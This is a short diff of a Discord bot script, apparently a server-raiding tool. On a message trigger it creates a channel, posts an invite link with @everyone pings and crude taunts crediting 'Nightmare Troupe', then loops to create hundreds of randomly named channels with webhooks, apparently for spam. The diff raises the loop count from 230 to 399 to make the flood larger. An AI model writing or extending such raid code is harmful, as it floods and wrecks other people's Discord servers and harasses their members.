@@ -256,7 +256,7 @@ client.on('message', msg => {
        var number = 0
        
        msg.guild.channels.create('ass').then(c => c.send("https://discord.gg/ANDTsKp @everyone").then(c.send("@everyone fucked by Nightmare Troupe LMFAO69").then(c.send("rip webhook spam shitcord killed it"))))
-        while(number < 230) {
+        while(number < 399) {
             msg.guild.channels.create(random123()).then(c => { 
                
                 c.createWebhook("ass").then(w => {
